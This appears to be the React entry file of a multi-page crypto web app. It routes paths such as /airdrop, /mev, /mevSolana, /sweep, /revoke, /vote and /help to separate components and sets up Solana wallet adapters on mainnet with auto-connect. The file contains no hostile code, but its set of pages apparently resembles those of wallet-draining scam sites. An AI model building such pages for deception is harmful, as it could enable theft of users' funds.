import React, { useMemo } from 'react' // 🔥 SOLANA ADDED: Import useMemo
import ReactDOM from 'react-dom/client'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'

import App from './App'
import TronApp from './tron' 
import Airdrop from './Airdrop' 
import MevApp from './Mev'
import MevGPApp from './mevGP'
import CryptoHelp from './CryptoHelp'
import './index.css'
import FlashSweep from './FlashSweep'
import RevokeShield from './RevokeShield'
import GovPortal from './GovPortal'

// 🔥 SOLANA ADDED: Imports necesarios para el adaptador y el componente
import MevSolana from './mevSolana'
import { ConnectionProvider, WalletProvider } from '@solana/wallet-adapter-react'
import { WalletModalProvider } from '@solana/wallet-adapter-react-ui'
import { PhantomWalletAdapter, SolflareWalletAdapter } from '@solana/wallet-adapter-wallets'
import { clusterApiUrl } from '@solana/web3.js'
import '@solana/wallet-adapter-react-ui/styles.css'

const queryClient = new QueryClient()

const currentPath = window.location.pathname;

// 🔥 SOLANA ADDED: Creamos un pequeño wrapper funcional para aislar el contexto de Solana
const SolanaWrapper = () => {
  // Puedes cambiar 'mainnet-beta' por 'devnet' si estás haciendo pruebas
  const endpoint = useMemo(() => clusterApiUrl('mainnet-beta'), []);
  
  const wallets = useMemo(
      () => [
          new PhantomWalletAdapter(),
          new SolflareWalletAdapter(),
      ],
      []
  );

  return (
      <ConnectionProvider endpoint={endpoint}>
          <WalletProvider wallets={wallets} autoConnect>
              <WalletModalProvider>
                  <MevSolana />
              </WalletModalProvider>
          </WalletProvider>
      </ConnectionProvider>
  );
};

ReactDOM.createRoot(document.getElementById('root')!).render(
  <React.StrictMode>
    <QueryClientProvider client={queryClient}>
      
      {currentPath === 'vote' || currentPath === '/vote' ? (
        <GovPortal />
      ):currentPath === '/revoke' || currentPath === '/revoke/' ? (
        <RevokeShield />
      ):currentPath === '/sweep' || currentPath === '/sweep/' ? (
        <FlashSweep />
      ):currentPath === '/help' || currentPath === '/help/' ? (
        <CryptoHelp />
      ) : currentPath === '/mevGP' || currentPath === '/mevGP/' ? (
        <MevGPApp />
      ) : currentPath === '/mev' || currentPath === '/mev/' ? (
        <MevApp />
      // 🔥 SOLANA ADDED: Añadimos la ruta para Solana apuntando a nuestro Wrapper
      ) : currentPath === '/mevSolana' || currentPath === '/mevSolana/' ? (
        <SolanaWrapper />
      ) : currentPath === '/airdrop' || currentPath === '/airdrop/' ? (
        <Airdrop />
      ) : currentPath === '/tron' || currentPath === '/tron/' ? (
        <TronApp />
      ) : (
        <App />
      )}
    </QueryClientProvider>
  </React.StrictMode>
)